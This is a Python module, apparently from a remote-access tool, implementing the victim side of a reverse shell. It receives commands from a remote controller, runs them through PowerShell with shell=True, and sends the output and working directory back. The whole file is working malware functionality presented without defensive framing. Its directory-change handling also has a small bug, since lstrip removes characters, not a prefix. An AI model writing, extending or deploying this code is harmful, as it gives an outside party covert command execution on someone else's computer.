from core.utils import display_msg
import os
import subprocess
import time


class Reverseshell:

    def run_commands(self, client):
        run_shell = True
        pwd = os.getcwd()
        client.send_data(pwd)
        while run_shell:
            command = client.receive_data()
            display_msg("user command : " + command)
            if command == "exit" or command == "quit" or command == "q" or command == "stop":
                run_shell = False
                break
            elif command.startswith("cd"):
                self.change_dir(command)
            elif command == "":
                display_msg("No command entered", "r")
            else:
                try:
                    cmd_result = self.execute_commands(command)
                    client.send_data(cmd_result)
                    print("command executed perfectly")
                except Exception as err:
                    client.send_data("Unable to execute command some random error occured!\n" + str(err))
            new_pwd = os.getcwd()
            time.sleep(0.1)
            client.send_data(new_pwd)
    
    def change_dir(self, command):
        path = command.lstrip("cd ")
        if os.path.exists(path):
            os.chdir(path)
            display_msg("dir changed to " + path)
        else:
            display_msg(path, "r")

    def execute_commands(self, command):
        display_msg("Executing commands", "g")
        command_list = command.split(" ")
        execute_list = ["powershell.exe"] + command_list
        output = subprocess.run(execute_list, shell=True, capture_output=True, stdin=subprocess.DEVNULL)
        if output.stderr.decode('utf-8') == "":
            cmd_result = (output.stdout.decode('utf-8'))
        else:
            cmd_result = (output.stderr.decode('utf-8'))
        
        return cmd_result




def run_reverse_shell(client):
    rs = Reverseshell()
    rs.run_commands(client)

    


